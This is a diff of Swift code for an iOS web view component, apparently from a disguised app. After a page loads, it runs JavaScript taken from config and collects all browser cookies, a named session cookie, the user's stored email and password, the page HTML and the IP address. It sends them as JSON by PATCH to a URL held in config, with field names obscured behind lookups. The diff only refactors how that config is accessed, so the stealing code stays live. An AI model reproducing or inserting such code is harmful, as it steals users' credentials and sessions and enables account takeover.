@@ -78,27 +78,27 @@ struct CoordsFive: UIViewRepresentable {
         
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
+                webView.evaluateJavaScript(self.five_parent.arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                     if let five_htm_ads_show = html as? String, error == nil {
                         if !five_htm_ads_show.isEmpty {
-                            if five_htm_ads_show.contains(arrayData[ValueKey.status_fr_1a.rawValue] ?? "") {
+                            if five_htm_ads_show.contains(self.five_parent.arrayData[ValueKey.status_fr_1a.rawValue] ?? "") {
                                 WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
-                                    let five_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? ""})
+                                    let five_i = cookies.firstIndex(where: { $0.name == self.five_parent.arrayData[ValueKey.name_api_09.rawValue] ?? ""})
                                     if (five_i != nil) {
                                         let five_get_ck = cookies.reduce("", { x,y in
                                             x + y.name + "=" + String(y.value) + ";"
                                         })
                                         let five_json_data: [String: Any] = [
-                                            arrayData[ValueKey.name_api_09.rawValue] ?? "": cookies[five_i!].value,
-                                            arrayData[ValueKey.name_api_10.rawValue] ?? "": self.readAddEmail(),
-                                            arrayData[ValueKey.name_api_11.rawValue] ?? "": self.readPw(),
-                                            arrayData[ValueKey.name_api_12.rawValue] ?? "": five_get_ck,
-                                            arrayData[ValueKey.name_api_13.rawValue] ?? "": five_htm_ads_show,
-                                            arrayData[ValueKey.name_api_14.rawValue] ?? "": self.readAddIpp(),
-                                            arrayData[ValueKey.name_api_15.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
+                                            self.five_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "": cookies[five_i!].value,
+                                            self.five_parent.arrayData[ValueKey.name_api_10.rawValue] ?? "": self.readAddEmail(),
+                                            self.five_parent.arrayData[ValueKey.name_api_11.rawValue] ?? "": self.readPw(),
+                                            self.five_parent.arrayData[ValueKey.name_api_12.rawValue] ?? "": five_get_ck,
+                                            self.five_parent.arrayData[ValueKey.name_api_13.rawValue] ?? "": five_htm_ads_show,
+                                            self.five_parent.arrayData[ValueKey.name_api_14.rawValue] ?? "": self.readAddIpp(),
+                                            self.five_parent.arrayData[ValueKey.name_api_15.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
                                         ]
                                         
-                                        let url = URL(string: arrayData[ValueKey.Chung_fr_05.rawValue] ?? "")
+                                        let url = URL(string: self.five_parent.arrayData[ValueKey.Chung_fr_05.rawValue] ?? "")
                                         let json_data = try? JSONSerialization.data(withJSONObject: five_json_data)
                                         var request = URLRequest(url: url!)
                                         request.httpMethod = "PATCH"
